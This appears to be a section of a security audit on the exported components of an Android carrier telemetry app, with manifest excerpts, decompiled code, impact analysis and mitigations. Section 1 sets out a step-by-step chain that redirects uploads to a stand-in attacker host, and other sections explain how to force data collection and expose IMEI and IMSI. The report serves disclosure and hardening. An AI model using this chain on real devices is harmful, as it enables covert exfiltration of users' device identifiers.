# Exported components and attack surface

Source of truth: `evidence/AndroidManifest.xml`, `evidence/components.csv`.
Threat model: a locally installed application with **no permissions and no user interaction**. All items below are reachable from such an app on Android 12+ unless stated otherwise.

---

## 1. `service.RegisterHelperService` — Critical local exposure

```xml
<service android:name="com.mobiletools.systemhelper.service.RegisterHelperService"
         android:exported="true">
    <intent-filter>
        <action android:name="com.mobiletools.systemhelper.service.IRegisterHelperService"/>
    </intent-filter>
</service>
```

No `android:permission`, no `android:protectionLevel`, no caller verification in `onBind()` (`RegisterHelperService.java:57-60`).

### AIDL surface (`service/a.java`, descriptor `…IRegisterHelperService`)

| Tx | Signature | Implementation | Effect |
|---|---|---|---|
| 1 | `void a(String)` | `l.a(ctx, str)` | writes preference `serverAddress` |
| 2 | `void a(int)` | `l.e/a/c/b/d/f/g(...)` | rewrites schedule, app-info, signal and sampling intervals |
| 3 | `void b()` | `l.b(ctx)` | deletes `com_mobiletools_systemhelper_preference.xml` |
| 4 | `void a(boolean)` | `d.f1331a = z` | toggles verbose logging |
| 5 | `boolean a()` | reads `preference_enable_log` | returns the log flag |

### Why transaction 1 matters

`c/d/a/b/l.java:241-243` is the only reader of `serverAddress`:

```java
public static String h(Context context) {
    return d.f1332b ? d.l : a(context, "serverAddress", d.l);
}
```

and `l.a(Context,String)` has exactly one caller — transaction 1. Every upload path (`control/g.java:41`, `control/e.java:45`) builds its URL from `l.h(context)`. Therefore:

```
malicious app  ──bind──►  RegisterHelperService
               ──a("http://attacker.example/x")──►  serverAddress
               ──explicit intent──►  OnBootReceiver  ──►  collection cycle
                                              └──►  POST http://attacker.example/x  (enveloped payload + clear-text metadata)
```

What the attacker gains:

- the full request, including clear-text `model`/`manuf`, source IP, timing and the deterministic `sign`;
- the ability to force collection at will, independent of the 24 h schedule;
- the ability to suppress the legitimate report (the carrier endpoint never sees it).

What the attacker does **not** gain: the plaintext body, because the AES key is RSA-encrypted to UNICOM's key. This limits the impact to metadata, control and channel capacity — still a serious privacy and integrity problem for a system application.

Mitigation: `android:exported="false"`, or a signature-level permission plus `Binder.getCallingUid()` validation.

---

## 2. `control.OnBootReceiver` — unauthenticated collection trigger

```xml
<receiver android:name="com.mobiletools.systemhelper.control.OnBootReceiver"
          android:exported="true">
    <intent-filter android:priority="2147483647">
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
        <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
    </intent-filter>
</receiver>
```

`onReceive()` branches only on `intent.getAction()`:

```java
if (action != null && (BOOT_COMPLETED.equals(action) || QUICKBOOT_POWERON.equals(action))) {
    ... schedule ... return;
}
// fall-through for every other action, including action == null
new SIMStateReceiver().a(ctx);
new ConnectStateReceiver().a(ctx);
if (n.a(context) != null) {
    b.a(ctx, firstPowerOn.isEmpty() ? "F" : "B");   // full device report
}
```

An explicit intent with an arbitrary action (or no action) from any app therefore starts a complete collection and upload. `BOOT_COMPLETED` itself is a protected broadcast and cannot be forged, but the receiver does not require it.

Mitigation: `exported="false"` (the boot broadcast still arrives; system broadcasts are delivered to non-exported receivers), and validate the action before doing any work.

---

## 3. `control.SIMStateReceiver` — same pattern, narrower effect

Exported with `SIM_STATE_CHANGED`. Any other action falls into the `else` branch (`SIMStateReceiver.java:83-87`) which calls `b.a(ctx, "T")`. The `T` path additionally requires an ICCID change (`c/d/a/a/n.java:127-130`), so the practical impact is limited to a SIM-swap probe unless the attacker can also alter the stored ICCID.

---

## 4. `Activity.TestActivity` — identity disclosure on screen

```xml
<activity android:name="com.mobiletools.systemhelper.Activity.TestActivity"
          android:exported="true">
    <intent-filter>
        <action android:name="com.mobiletools.systemhelper.activity.testactivity"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</activity>
```

`onCreate()` requests the five runtime permissions if missing, then renders `b.a(context,"").a()` into a `TextView` (`TestActivity.java:19-39`) — the complete JSON including IMEI, IMSI, ICCID, cell identity and coordinates.

Reachable by any app via `startActivity(new Intent().setComponent(...))`. Impact: disclosure to a shoulder-surfer or screen-capture malware; also a convenient way to make the app request its permissions without user intent. Mitigation: remove from release builds; if retained, `exported="false"` plus a signature permission.

---

## 5. Non-exported but notable

| Component | Observation |
|---|---|
| `service.RegisterIntentService` | binds to a `com.gree.telephonymanager.IGreeTelephonyManager` descriptor (`c/c/a/a.java`) that is never resolved — dead code from a Gree codebase |
| `service.RegisterJobService` | correctly guarded by `BIND_JOB_SERVICE` |
| `com.baidu.location.f` | runs in `:remote`, no permission, part of the bundled SDK |
| `FOREGROUND_SERVICE` permission | declared, `startForeground()` never called |

---

## 6. Summary

| # | Component | Reachable by | Precondition | Impact |
|---|---|---|---|---|
| 1 | `RegisterHelperService` | any app | none | redirect uploads, change schedule, enable logging, wipe state |
| 2 | `OnBootReceiver` | any app (explicit intent) | none | forced collection + upload |
| 3 | `SIMStateReceiver` | any app (explicit intent) | ICCID change | SIM-swap probe |
| 4 | `TestActivity` | any app | runtime permissions granted | on-screen identity disclosure |

Items 1 and 2 compose into an on-demand exfiltration primitive. Individually each is a missing-export-control defect; together they turn a passive telemetry agent into a remotely steerable one.
